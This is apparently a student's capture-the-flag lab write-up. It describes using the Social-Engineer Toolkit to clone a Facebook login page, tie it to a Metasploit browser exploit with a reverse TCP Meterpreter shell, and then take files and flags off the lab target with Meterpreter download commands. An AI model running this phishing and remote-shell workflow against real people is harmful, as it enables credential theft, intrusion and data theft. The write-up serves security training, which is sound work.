In this lab, I am setting up a fake Facebook website, then sending the
link to that fake website via email to the target. The target will login
to the fake facebook which will run an exploit through metasploit to
connect to the target machine

### **Casting the Net - Setting up the fake website**

In the given machine, I was just able to type 'setoolkit' in the
terminal to launch the SET application

I selected (1) for Social-Engineering Attacks

\(2\) for Website Attack Vectors

\(2\) for Metasploit Browser Method

\(1\) to use Web Templates

I'm not sure what the next step meant, but I put in "no" for using
NAT/port forwarding

![](output\Social Engineering using a SET/media/image7.png){width="5.15625in"
height="2.830989720034996in"}

I typed my host IP address which was "175.45.176.199"

\(3\) to use the Facebook web template

\(46\) for the Metasploit browser exploit

\(2\) for Reverse TCP Meterpreter Shell

{Enter} for using the default port of 443

Waited for a bunch of messages from Metasploit starting the server w/
exploits

Waited until "Done, found x exploit modules"

### **Getting Attacked - Using the Target System**

I logged in to the target server

I'm not sure how, but there was already an email sent.

The hyperlink to "facebook.com" sent the browser to the fake website

I, as the target, signed in with whatever credentials I was given but I
believe literally anything would work, as long as they hit enter which
will send them to another page. This exploit page will seem to "hang" as
the exploit begins

![](output\Social Engineering using a SET/media/image12.png){width="5.473958880139983in"
height="3.744339457567804in"}![](output\Social Engineering using a SET/media/image2.png){width="5.354166666666667in"
height="3.6565212160979876in"}

### **Connecting to the Machine**![](output\Social Engineering using a SET/media/image8.png){width="4.953125546806649in" height="1.1654407261592301in"}

Now back the attacker's console, in the "msf auxiliary" command line

**'sessions -l'** to **list all active sessions**

**'sessions** -i **#'** to **interact with a certain machine**

in this case i do 'sessions -i 1' to interact with the first machine

![](output\Social Engineering using a SET/media/image9.png){width="10.0in"
height="2.513888888888889in"}**\
\
**

### **Stealing Data - [[Working in a Meterpreter Shell]{.underline}](https://docs.google.com/document/d/1ww7Tdts1mNIEKEzmUEuEu2cWaBv3Tr-fGKvRfu_FwK0/edit)**

**'pwd'** to find the **present working directory** to figure out where
I am

Then can use normal windows 'cd' commands to change directory

**'cd /'** to change to root directory

![](output\Social Engineering using a SET/media/image1.png){width="5.052083333333333in"
height="1.7395833333333333in"}

'**ls'** to list files and folders in the directory, any name that pops
up without an extension is a folder I assume

![](output\Social Engineering using a SET/media/image6.png){width="10.0in"
height="4.708333333333333in"}

**'cd share'** to move into the share folder

![](output\Social Engineering using a SET/media/image11.png){width="10.0in"
height="3.0555555555555554in"}

We can see a folder called "DeathStar" which very likely has classified
imperial plans that I should investigate.

Moving into the DeathStar folder, I see 4 images of blueprints, I can
download the ENTIRE directory by using **'download \*.\*'** and then
sending it to my root folder by adding **'/root'**

So the entire command is **'download \*.\* /root'** to download the
entire directory and then outputting it into my root folder

I can also do **'/root/Blueprints'** to put these images in a dedicated
folder that was just created with the command

![](output\Social Engineering using a SET/media/image3.png){width="10.0in"
height="5.847222222222222in"}

![](output\Social Engineering using a SET/media/image10.png){width="10.0in"
height="2.7777777777777777in"}

Each blueprint has a flag somewhere in the picture

blueprint1 = 999818

blueprint2 = 111222

blueprint3 = 777558

blueprint4 = 655913

I can also download the flag4.xml file in /share using the same download
method. Opening it reveals the flag in the first few lines of the file
(444588)

![](output\Social Engineering using a SET/media/image4.png){width="8.635416666666666in"
height="3.15625in"}

### **Closing notes**

I can find the ip address of the machine using **'ipconfig'**

**'background'** lets me put the current session in the background so I
can interact with the msf auxiliary console

Even if the target machine closes the web browser, I still have a
completely normal connected session to the machine. I can still move
through directories and download files and see changes made such as
adding or deleting files. I only lost access to the machine when they
manually stopped the "notepad.exe" process that I noticed was
responsible for the exploit in the first section.

In this lab, I noticed an additional machine in the topology called the
Windows 8.1 Attack Server. I'm not really sure how this machine played a
role in this, but I noticed it has the same 175.45.176.200 ip address as
the fake Facebook website, so perhaps it's the server hosting the fake
website? Also I never did any command involving that ip address, so
maybe it's something that was set up before.

![](output\Social Engineering using a SET/media/image5.png){width="8.59375in"
height="10.3125in"}

### Skills

Social Engineering Toolkit

Metasploit

Meterpreter
